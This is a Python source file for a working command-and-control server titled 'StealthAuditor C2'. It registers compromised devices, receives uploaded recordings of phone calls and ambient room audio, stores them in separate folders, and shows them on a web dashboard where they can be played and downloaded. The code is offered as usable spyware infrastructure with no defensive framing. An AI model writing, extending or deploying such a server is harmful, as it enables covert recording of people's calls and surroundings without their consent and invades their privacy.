#!/usr/bin/env python3
import os
import json
import uuid
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi

PORT = int(os.environ.get("PORT", "10000"))
C2_AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "stealth-auditor-token-2026")
SAVE_DIR = os.environ.get("SAVE_DIR", "./c2_recordings")

DEVICES = {}
RECORDINGS = []


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def ensure_dirs():
    os.makedirs(os.path.join(SAVE_DIR, "calls"), exist_ok=True)
    os.makedirs(os.path.join(SAVE_DIR, "ambient"), exist_ok=True)


def save_recording(device_id, filename, data, remote_ip):
    ensure_dirs()
    if filename.startswith("CALL_"):
        subdir = "calls"
    elif filename.startswith("AMBIENT_"):
        subdir = "ambient"
    else:
        subdir = "misc"

    save_dir = os.path.join(SAVE_DIR, subdir)
    os.makedirs(save_dir, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = f"{ts}_{filename}"
    path = os.path.join(save_dir, safe_name)

    with open(path, "wb") as f:
        f.write(data)

    rec_id = str(uuid.uuid4())[:8]
    RECORDINGS.insert(0, {
        "id": rec_id,
        "device_id": device_id,
        "type": subdir,
        "filename": safe_name,
        "path": path,
        "size": len(data),
        "timestamp": now(),
        "remote_ip": remote_ip,
    })

    if device_id not in DEVICES:
        DEVICES[device_id] = {"first_seen": now()}
    DEVICES[device_id].update({
        "last_seen": now(),
        "recordings_count": DEVICES[device_id].get("recordings_count", 0) + 1,
    })

    print(f"[+] {now()} | {device_id} | {subdir} | {safe_name} ({len(data):,} bytes)")
    return rec_id


class C2Handler(BaseHTTPRequestHandler):
    def ok(self, data):
        self.send_json(200, data)

    def send_json(self, status, data):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def auth_ok(self):
        return self.headers.get("X-Auth-Token") == C2_AUTH_TOKEN

    def do_GET(self):
        p = self.path
        if p in ["/", "/dashboard"]:
            return self.dash()
        if p == "/api/recordings":
            return self.ok({"recordings": RECORDINGS[:100]})
        if p == "/api/devices":
            return self.ok({"devices": DEVICES})
        if p.startswith("/download/"):
            rid = p.split("/")[-1]
            for r in RECORDINGS:
                if r["id"] == rid and os.path.exists(r["path"]):
                    self.send_response(200)
                    self.send_header("Content-Type", "audio/aac")
                    self.send_header("Content-Disposition", f"attachment; filename={r['filename']}")
                    self.end_headers()
                    with open(r["path"], "rb") as f:
                        self.wfile.write(f.read())
                    return
        self.send_error(404)

    def do_POST(self):
        if not self.auth_ok():
            self.send_error(403)
            return
        if self.path == "/checkin":
            return self.checkin()
        if self.path == "/upload":
            return self.upload()
        self.send_error(404)

    def checkin(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="ignore")
        d = json.loads(body) if body else {}
        did = d.get("device_id", "unknown")
        if did not in DEVICES:
            DEVICES[did] = {"first_seen": now()}
        DEVICES[did].update({
            "last_seen": now(),
            "model": d.get("model"),
            "battery": d.get("battery"),
            "ip": self.client_address[0],
        })
        self.ok({"status": "ok"})

    def upload(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={"REQUEST_METHOD": "POST", "CONTENT_TYPE": self.headers.get("Content-Type")},
        )
        item = form["file"] if "file" in form else None
        if not item or not hasattr(item, "file"):
            self.send_error(400)
            return
        did = self.headers.get("X-Device-ID", "unknown")
        rid = save_recording(did, item.filename or "recording.aac", item.file.read(), self.client_address[0])
        self.ok({"status": "ok", "id": rid})

    def dash(self):
        rows = "".join(
            f"<tr><td>{r['timestamp']}</td><td>{r['device_id']}</td><td>{r['type']}</td>"
            f"<td>{r['filename']}</td><td>{r['size']:,}</td>"
            f"<td><audio controls src='/download/{r['id']}' style='width:220px'></audio>"
            f" <a href='/download/{r['id']}'>DL</a></td></tr>"
            for r in RECORDINGS[:100]
        )
        devs = "".join(
            f"<tr><td>{k}</td><td>{v.get('model','?')}</td><td>{v.get('last_seen','?')}</td>"
            f"<td>{v.get('battery','?')}%</td><td>{v.get('recordings_count',0)}</td></tr>"
            for k, v in DEVICES.items()
        )
        html = f"""<!doctype html>
<html>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width'>
<title>StealthAuditor C2</title>
<style>
body{{background:#111;color:#eee;font-family:sans-serif;padding:15px}}
h1{{color:#0f0}} h2{{color:#0ff}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th,td{{border:1px solid #333;padding:6px;text-align:left}}
</style>
</head>
<body>
<h1>StealthAuditor C2</h1>
<h2>Devices</h2>
<table>
<tr><th>ID</th><th>Model</th><th>Last Seen</th><th>Battery</th><th>Recs</th></tr>
{devs}
</table>
<h2>Recordings</h2>
<table>
<tr><th>Time</th><th>Device</th><th>Type</th><th>File</th><th>Size</th><th>Play</th></tr>
{rows}
</table>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, fmt, *args):
        pass


if __name__ == "__main__":
    ensure_dirs()
    srv = HTTPServer(("0.0.0.0", PORT), C2Handler)
    print(f"C2 listening on port {PORT}")
    srv.serve_forever()
